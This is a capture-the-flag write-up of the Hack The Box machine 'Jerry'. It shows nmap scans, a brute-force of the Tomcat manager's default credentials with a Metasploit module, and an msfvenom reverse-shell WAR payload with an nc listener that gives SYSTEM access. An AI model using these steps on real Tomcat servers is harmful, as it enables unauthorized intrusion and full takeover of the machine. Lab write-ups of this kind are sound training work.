---
title: Jerry
draft: false
tags:
---

![[Jerry.png|450]]![[Pasted image 20250308164106.png|250]]

Machine: https://app.hackthebox.com/machines/144

---

# Enumeration
## Port Scanning
- Using [[content/Tools/Nmap|Nmap]] in order to get opended ports and name service
```shell
nmap -p- -sS -n -Pn --min-rate 5000 10.10.10.95 -oG allPorts
```
>[!example]- Result
>![[Pasted image 20250308165633.png]]

- now a version scanning a run some common scripts
```bash
nmap -p8080 -sCV -Pn -n --min-rate 5000 10.10.10.95 -oN Targeted
```
>[!example]- Result
>![[Pasted image 20250308165805.png]]

## Web page
- The web page is about tomcat (a service that allow it to use Java as backend language), we have the version of Tomcat `7.0.88` and we can access to "Status" feature using the default credentials `admin:admin`
>[!example]- Result
>![[Pasted image 20250308170842.png]]

- The above credentials doesnt work on this panel `manager/html` so we can use this [[Metasploit]] module in order to find some common credentials
```bash
use auxiliary/scanner/http/tomcat_mgr_login
```
>[!example]- Result
>![[Pasted image 20250308172145.png]]

Credentials: `tomcat:s3cret`
# Exploitation
- we can use this credentials to get access to the manager, and we can upload a malicious `.WAR` file, and get a revershell, go lets generate it using [[msfvenom]]
```bash
msfvenom -p windows/x64/shell_reverse_tcp --platform windows -a x64 LHOST=10.10.16.6 LPORT=4444 -f war -o payload.war
```
>[!example]- Result
>![[Pasted image 20250308173528.png]]

- we need to check the name of the `.jsp` file inside the `.war` file, using 7z
```bash
7z l payload.war
```
>[!example]- Result
>![[Pasted image 20250308174737.png]]

Name: `qyzwvusv.jsp`

- uploading the `WAR` file and getting access
```bash
nc -lnvp 4444
```

>[!example]- Result
>![[Pasted image 20250308173907.png]]
>![[Pasted image 20250308173909.png]]
>![[Pasted image 20250308174903.png]]

- Perfect now we have access to the machine, and looks like we are `nt authority\system`
```bash
whoami
type \Users\Administrator\Desktop\flags\"2 for the price of 1.txt"
```
>[!example]- Result
>![[Pasted image 20250308175003.png]]
>![[Pasted image 20250308175322.png]]

